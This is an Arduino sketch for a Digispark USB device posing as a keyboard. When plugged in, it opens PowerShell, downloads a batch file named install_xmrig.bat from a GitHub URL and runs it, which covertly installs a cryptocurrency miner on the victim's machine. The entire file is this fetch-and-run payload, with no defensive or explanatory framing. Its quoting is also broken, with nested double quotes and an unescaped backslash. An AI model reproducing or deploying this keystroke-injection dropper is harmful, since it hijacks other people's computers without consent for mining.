#include "DigiKeyboard.h"
void setup() {
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("Invoke-WebRequest -Uri "https://raw.githubusercontent.com/kazz920/eden/refs/heads/main/install_xmrig.bat" -OutFile 'install_xmrig.bat'");
  DigiKeyboard.delay(1000);
  DigiKeyboard.print(".\install_xmrig.bat");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}